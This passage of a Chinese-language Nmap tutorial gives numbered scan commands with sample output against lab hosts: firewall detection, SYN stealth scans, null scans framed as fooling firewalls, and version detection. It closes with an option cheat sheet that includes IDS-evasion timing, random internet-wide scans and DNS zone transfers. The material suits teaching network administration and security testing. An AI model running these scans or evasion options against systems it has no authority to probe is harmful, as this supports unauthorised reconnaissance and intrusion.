unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see http://www.insecure.org/cgi-bin/nmap-submit.cgi).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">SInfo(V=4.11%P=i686-redhat-linux-gnu%D=11/11%Tm=52815CF4%O=22%C=1%M=080027)</span><br><span class="line">TSeq(Class=TR%IPID=Z%TS=1000HZ)</span><br><span class="line">T1(Resp=Y%DF=Y%W=16A0%ACK=S++%Flags=AS%Ops=MNNTNW)</span><br><span class="line">T2(Resp=N)</span><br><span class="line">T3(Resp=Y%DF=Y%W=16A0%ACK=S++%Flags=AS%Ops=MNNTNW)</span><br><span class="line">T4(Resp=Y%DF=Y%W=0%ACK=O%Flags=Option -O and -osscan-guess also helps to discover OS</span><br><span class="line">R%Ops=)</span><br><span class="line">T5(Resp=Y%DF=Y%W=0%ACK=S++%Flags=AR%Ops=)</span><br><span class="line">T6(Resp=Y%DF=Y%W=0%ACK=O%Flags=R%Ops=)</span><br><span class="line">T7(Resp=Y%DF=Y%W=0%ACK=S++%Flags=AR%Ops=)</span><br><span class="line">PU(Resp=Y%DF=N%TOS=C0%IPLEN=164%RIPTL=148%RID=E%RIPCK=E%UCK=E%ULEN=134%DAT=E)</span><br><span class="line"> </span><br><span class="line">Uptime 0.221 days (since Mon Nov 11 12:22:16 2013)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 11.064 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="11-扫描主机侦测防火墙-sA"><a href="#11-扫描主机侦测防火墙-sA" class="headerlink" title="11.扫描主机侦测防火墙-sA"></a>11.扫描主机侦测防火墙-sA</h3><p>下面的命令将扫描远程主机以探测该主机是否使用了包过滤器或防火墙。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sA 192.168.0.101</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 16:27 EST</span><br><span class="line">All 1680 scanned ports on server2.tecmint.com (192.168.0.101) are UNfiltered</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 0.382 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="12-扫描主机检测是否有防火墙保护-PN"><a href="#12-扫描主机检测是否有防火墙保护-PN" class="headerlink" title="12.扫描主机检测是否有防火墙保护-PN"></a>12.扫描主机检测是否有防火墙保护-PN</h3><p>扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -PN 192.168.0.101</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 16:30 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 0.399 seconds</span><br></pre></td></tr></table></figure>

<h3 id="13-找出网络中的在线主机-sP"><a href="#13-找出网络中的在线主机-sP" class="headerlink" title="13.找出网络中的在线主机-sP"></a>13.找出网络中的在线主机-sP</h3><p>使用“<strong>-sP</strong>”选项，我们可以简单的检测网络中有哪些在线主机，该选项会跳过端口扫描和其他一些检测。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sP 192.168.0.*</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-18 11:01 EST</span><br><span class="line">Host server1.tecmint.com (192.168.0.100) appears to be up.</span><br><span class="line">Host server2.tecmint.com (192.168.0.101) appears to be up.</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line">Nmap finished: 256 IP addresses (2 hosts up) scanned in 5.109 seconds</span><br></pre></td></tr></table></figure>

<h3 id="14-执行快速扫描-F"><a href="#14-执行快速扫描-F" class="headerlink" title="14.执行快速扫描-F"></a>14.执行快速扫描-F</h3><p>你可以使用“<strong>-F</strong>”选项执行一次快速扫描，仅扫描列在nmap-services文件中的端口而避开所有其它的端口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -F 192.168.0.101</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 16:47 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1234 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 0.322 seconds</span><br></pre></td></tr></table></figure>

<h3 id="15-查看Nmap的版本"><a href="#15-查看Nmap的版本" class="headerlink" title="15.查看Nmap的版本"></a>15.查看Nmap的版本</h3><p>你可以使用“<strong>-V</strong>”选项来检测你机子上Nmap的版本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -V</span><br><span class="line"> </span><br><span class="line">Nmap version 4.11 ( http://www.insecure.org/nmap/ )</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="16-顺序扫描端口-r"><a href="#16-顺序扫描端口-r" class="headerlink" title="16.顺序扫描端口-r"></a>16.顺序扫描端口-r</h3><p>使用“-r”选项表示不会随机的选择端口扫描。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -r 192.168.0.101</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 16:52 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 0.363 seconds</span><br></pre></td></tr></table></figure>

<h3 id="17-打印主机接口和路由-iflist"><a href="#17-打印主机接口和路由-iflist" class="headerlink" title="17.打印主机接口和路由-iflist"></a>17.打印主机接口和路由-iflist</h3><p>你可以使用nmap的“<strong>–iflist</strong>”选项检测主机接口和路由信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap --iflist</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 17:07 EST</span><br><span class="line">************************INTERFACES************************</span><br><span class="line">DEV  (SHORT) IP/MASK          TYPE     UP MAC</span><br><span class="line">lo   (lo)    127.0.0.1/8      loopback up</span><br><span class="line">eth0 (eth0)  192.168.0.100/24 ethernet up 08:00:27:11:C7:89</span><br><span class="line"> </span><br><span class="line">**************************ROUTES**************************</span><br><span class="line">DST/MASK      DEV  GATEWAY</span><br><span class="line">192.168.0.0/0 eth0</span><br><span class="line">169.254.0.0/0 eth0</span><br></pre></td></tr></table></figure>

<p>从上面的输出你可以看到，nmap列举出了你系统上的接口以及它们各自的路由信息。</p>
<h3 id="18-扫描特定的端口-p"><a href="#18-扫描特定的端口-p" class="headerlink" title="18.扫描特定的端口-p"></a>18.扫描特定的端口-p</h3><p>使用Nmap扫描远程机器的端口有各种选项，你可以使用“-<strong>p</strong>”选项指定你想要扫描的端口，默认情况下nmap只扫描<strong>TCP</strong>端口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -p 80 server2.tecmint.com</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 17:12 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) sca</span><br></pre></td></tr></table></figure>

<h3 id="19-扫描TCP端口-p-T"><a href="#19-扫描TCP端口-p-T" class="headerlink" title="19.扫描TCP端口-p T:"></a>19.扫描TCP端口-p T:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -p T:8888,80 server2.tecmint.com</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 17:15 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 0.157 seconds</span><br></pre></td></tr></table></figure>

<h3 id="20-扫描UDP端口-sU"><a href="#20-扫描UDP端口-sU" class="headerlink" title="20.扫描UDP端口-sU"></a>20.扫描UDP端口-sU</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sU 53 server2.tecmint.com</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 17:15 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">53/udp   open  http</span><br><span class="line">8888/udp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 0.157 seconds</span><br></pre></td></tr></table></figure>

<h3 id="21-扫描多个端口"><a href="#21-扫描多个端口" class="headerlink" title="21.扫描多个端口"></a>21.扫描多个端口</h3><p>你还可以使用选项“-<strong>P</strong>”来扫描多个端口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -p 80,443 192.168.0.101</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-18 10:56 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line">80/tcp  open   http</span><br><span class="line">443/tcp closed https</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 0.190 seconds</span><br></pre></td></tr></table></figure>

<h3 id="22-扫描指定范围内的端口"><a href="#22-扫描指定范围内的端口" class="headerlink" title="22.扫描指定范围内的端口"></a>22.扫描指定范围内的端口</h3><p>您可以使用表达式来扫描某个范围内的端口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]#  nmap -p 80-160 192.168.0.101</span><br></pre></td></tr></table></figure>

<h3 id="23-查找主机服务版本号-sV"><a href="#23-查找主机服务版本号-sV" class="headerlink" title="23.查找主机服务版本号-sV"></a>23.查找主机服务版本号-sV</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sV 192.168.0.101</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 17:48 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.2.3 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (rpc #100000)</span><br><span class="line">957/tcp  open  status   1 (rpc #100024)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    lighttpd 1.4.32</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 12.624 seconds</span><br></pre></td></tr></table></figure>

<h3 id="24-使用TCP-ACK-PA-和TCP-Syn-PS-扫描远程主机"><a href="#24-使用TCP-ACK-PA-和TCP-Syn-PS-扫描远程主机" class="headerlink" title="24.使用TCP ACK (-PA)和TCP Syn (-PS)扫描远程主机"></a>24.使用TCP ACK (-PA)和TCP Syn (-PS)扫描远程主机</h3><p>有时候包过滤防火墙会阻断标准的ICMP ping请求，在这种情况下，我们可以使用<strong>TCP ACK</strong>和<strong>TCP Syn</strong>（tcp探测扫描）方法来扫描远程主机。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -PS 192.168.0.101</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 17:51 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 0.360 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="25-使用TCP-ACK扫描远程主机上特定的端口-PA-p"><a href="#25-使用TCP-ACK扫描远程主机上特定的端口-PA-p" class="headerlink" title="25.使用TCP ACK扫描远程主机上特定的端口-PA -p"></a>25.使用TCP ACK扫描远程主机上特定的端口-PA -p</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -PA -p 22,80 192.168.0.101</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 18:02 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 0.166 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="26-使用TCP-Syn扫描远程主机上特定的端口"><a href="#26-使用TCP-Syn扫描远程主机上特定的端口" class="headerlink" title="26. 使用TCP Syn扫描远程主机上特定的端口"></a>26. 使用TCP Syn扫描远程主机上特定的端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -PS -p 22,80 192.168.0.101</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 18:08 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 0.165 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="27-执行一次隐蔽的扫描-sS"><a href="#27-执行一次隐蔽的扫描-sS" class="headerlink" title="27.执行一次隐蔽的扫描-sS"></a>27.执行一次隐蔽的扫描-sS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sS 192.168.0.101</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 18:10 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 0.383 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="28-使用TCP-Syn扫描最常用的端口-sT"><a href="#28-使用TCP-Syn扫描最常用的端口-sT" class="headerlink" title="28.使用TCP Syn扫描最常用的端口-sT"></a>28.使用TCP Syn扫描最常用的端口-sT</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sT 192.168.0.101</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 18:12 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 0.406 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="29-执行TCP空扫描以骗过防火墙-sN"><a href="#29-执行TCP空扫描以骗过防火墙-sN" class="headerlink" title="29.执行TCP空扫描以骗过防火墙-sN"></a>29.执行TCP空扫描以骗过防火墙-sN</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sN 192.168.0.101</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 19:01 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE         SERVICE</span><br><span class="line">22/tcp   open|filtered ssh</span><br><span class="line">80/tcp   open|filtered http</span><br><span class="line">111/tcp  open|filtered rpcbind</span><br><span class="line">957/tcp  open|filtered unknown</span><br><span class="line">3306/tcp open|filtered mysql</span><br><span class="line">8888/tcp open|filtered sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 1.584 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="指令分类"><a href="#指令分类" class="headerlink" title="指令分类"></a>指令分类</h3><h4 id="初级使用"><a href="#初级使用" class="headerlink" title="初级使用"></a>初级使用</h4><p>nmap -v scanme.nmap.org</p>
<p>这个选项扫描主机scanme.nmap.org中所有的保留TCP端口。选项-v启用细节模式。</p>
<p>nmap -A -T4 scanme.nmap.org</p>
<p>-A用来进行操作系统及其版本的探测，-T4 可以加快执行速度</p>
<p>nmap -sS -O scanme.nmap.org/24</p>
<p>进行秘密SYN扫描，对象为主机Saznme所在的“C类”网段的255台主机。同时尝试确定每台工作主机的操作系统类型。因为进行SYN扫描 和操作系统检测，这个扫描需要有根权限。</p>
<p>nmap -sV -p 22，53，110，143，4564 198.116.0-255.1-127</p>
<p>进行主机列举和TCP扫描，对象为B类198.116网段中255个8位子网。这 个测试用于确定系统是否运行了sshd、DNS、imapd或4564端口。如果这些端口 打开，将使用版本检测来确定哪种应用在运行。(-sV)</p>
<p>nmap -v -iR 100000 -P0 -p 80</p>
<p>随机选择100000台主机扫描是否运行Web服务器(80端口)。由起始阶段发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因此使用-P0禁止对主机列表。</p>
<p>nmap -P0 -p80 -oX logs/pb-port80scan.xml -oG logs/pb-port80scan.gnmap 216.163.128.20/20</p>
<p>扫描4096个IP地址，查找Web服务器(不ping)，将结果以Grep和XML格式保存。</p>
<p>host -l company.com | cut -d -f 4 | nmap -v -iL -</p>
<p>进行DNS区域传输，以发现company.com中的主机，然后将IP地址提供给 Nmap。上述命令用于GNU/Linux – 其它系统进行区域传输时有不同的命令。</p>
<h4 id="深入扫描命令"><a href="#深入扫描命令" class="headerlink" title="深入扫描命令"></a>深入扫描命令</h4><p>-Pn  不探测扫描（假定所有主机都存活）</p>
<p>-PB  默认探测扫描（探测端口：TCP 80，445&amp;ICMP）</p>
<p>-PS  &lt;portlist&gt;  tcp探测扫描</p>
<p>-PE  ICMP Echo Request</p>
<p>-PP  ICMP Timestamp Request</p>
<p>-PM  ICMP Netmask Request</p>
<h4 id="扫描类型"><a href="#扫描类型" class="headerlink" title="扫描类型"></a>扫描类型</h4><p>-sP  只探测主机在线情况</p>
<p>-sS  SYN扫描（隐身扫描）</p>
<p>-ST  TCP扫描</p>
<p>-sU  UDP扫描</p>
<p>-sV  系统版本检测</p>
<p>-O   操作系统识别</p>
<p>–scanflags  指定TCP标识位（设置URG, ACK, PSH,RST,SYN,FIN位）</p>
<h4 id="细粒度的时间选项"><a href="#细粒度的时间选项" class="headerlink" title="细粒度的时间选项"></a>细粒度的时间选项</h4><p>–min-hostgroup/max-hostgroup <size>  平行的主机扫描组的大小</size></p>
<p>–min-parallelism/max-parallelism <numprobes>  并行探测</numprobes></p>
<p>–min-rtt-timeout/max-rtttimeout/initial-rtt-timeout <time>   指定每轮探测的时间</time></p>
<p>–max-retries <tries>    扫描探测的上限次数设定</tries></p>
<p>–host-timeout <time>    设置timeout时间</time></p>
<p>–scan-delay/–max-scan-delay <time>  调整两次探测之间的延迟</time></p>
<p>–min-rate <number>     每秒发送数据包不少于<number>次</number></number></p>
<h4 id="时序选项"><a href="#时序选项" class="headerlink" title="时序选项"></a>时序选项</h4><p>-T0  偏执的：非常非常慢，用于IDS逃逸</p>
<p>-T1  猥琐的：相当慢，用于IDS逃逸</p>
<p>-T2  有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍</p>
<p>-T3  普通的：默认，根据目标的反应自动调整时间模式</p>
<p>-T4  野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标</p>
<p>-T5  疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口</p>
<h4 id="misc选项"><a href="#misc选项" class="headerlink" title="misc选项"></a>misc选项</h4><p>-n  禁止反向IP地址查找</p>
<p>-6  只是用 IPv6</p>
